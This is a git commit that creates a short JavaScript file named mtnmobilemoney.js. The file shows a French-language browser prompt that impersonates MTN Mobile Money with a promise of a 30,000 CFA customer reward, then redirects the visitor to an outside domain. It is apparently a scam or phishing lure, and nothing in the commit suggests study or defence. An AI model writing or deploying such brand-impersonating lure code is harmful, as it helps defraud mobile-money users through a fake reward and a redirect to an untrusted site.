636c0cb4143092e3f4a6121134780113823c3a2d
bigetijazz28 <bigetijazz28@gmail.com>
2025-08-24 07:16:11 +0100

    Create mtnmobilemoney.js

---
+++ mtnmobilemoney.js
@@ -0,0 +1,6 @@
+
+var password = 'Obtenez 30,000 CFA'
+password=prompt('MTN Mobile Money: Vérifiez si vous êtes éligible pour recevoir une récompense client de 30 000 CFA de MTN Mobile Money, appuyez sur OK pour vérifier maintenant','Obtenez 30,000 CFA');
+if (password != 'Obtenez 30,000 CFA') {
+location.href='https://www.ekuula.xyz/mtnmobilemoney';
+}
